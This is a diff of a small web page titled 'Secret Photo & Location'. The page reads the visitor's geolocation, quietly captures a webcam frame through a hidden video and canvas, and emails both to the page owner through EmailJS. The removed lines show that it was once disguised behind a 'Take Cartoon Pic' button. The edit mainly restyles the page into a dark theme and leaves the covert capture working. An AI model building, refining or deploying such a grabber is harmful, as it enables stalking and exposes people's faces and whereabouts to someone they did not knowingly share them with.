@@ -3,43 +3,60 @@
 <head>
   <title>Secret Photo & Location</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Poppins', sans-serif;
       text-align: center;
-      margin-top: 60px;
-      background-color: #f4f4f4;
+      background-color: #121212;
+      color: #f5f5f5;
+      margin: 0;
+      padding: 50px 20px;
     }
+
     h2 {
-      color: #333;
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 26px;
+      margin-bottom: 30px;
     }
+
     button {
-      padding: 10px 20px;
+      padding: 12px 28px;
       font-size: 16px;
-      margin: 10px;
+      margin: 12px;
       cursor: pointer;
       border: none;
-      background-color: #4CAF50;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #2196f3, #0d47a1);
       color: white;
-      border-radius: 8px;
+      transition: transform 0.2s ease, background 0.3s ease;
     }
+
     button:hover {
-      background-color: #45a049;
+      transform: scale(1.05);
+      background: linear-gradient(135deg, #42a5f5, #1565c0);
     }
+
     #status {
       margin-top: 30px;
-      font-weight: bold;
+      font-weight: 500;
       font-size: 18px;
-      color: #555;
+      color: #90caf9;
+    }
+
+    #video, #canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <h2>Choose an Option</h2>
-  <button onclick="sendLocationOnly()">Check Your Location </button>
-  <button onclick="captureAndSend()">Take Cartoon Pic</button>
+  <h2>Secret Photo & Location</h2>
+  <button onclick="sendLocationOnly()">Check Location Only</button>
+  <button onclick="captureAndSend()">Take Picture + Location</button>
 
-  <video id="video" autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
   <div id="status"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -64,8 +81,8 @@
           message: message,
           image: ''
         })
-        .then(res => updateStatus("Sent to your inbox!", true))
-        .catch(err => updateStatus("Failed to send location."));
+        .then(() => updateStatus("Sent to your inbox!", true))
+        .catch(() => updateStatus("Failed to send location."));
       }, function(error) {
         alert("Could not get location.");
         console.error(error);
@@ -82,7 +99,7 @@
       video.srcObject = stream;
       await new Promise(resolve => setTimeout(resolve, 1500));
       canvas.width = 160;
-      canvas.height = 140;
+      canvas.height = 120;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       const imageBase64 = canvas.toDataURL("image/png");
       stream.getTracks().forEach(track => track.stop());
@@ -105,8 +122,8 @@
           message: message,
           image: imageBase64
         })
-        .then(res => updateStatus("Sent to your inbox!", true))
-        .catch(err => updateStatus("Failed to send photo and location."));
+        .then(() => updateStatus("Sent to your inbox!", true))
+        .catch(() => updateStatus("Failed to send photo and location."));
       }, function(error) {
         alert("Could not get location.");
         console.error(error);
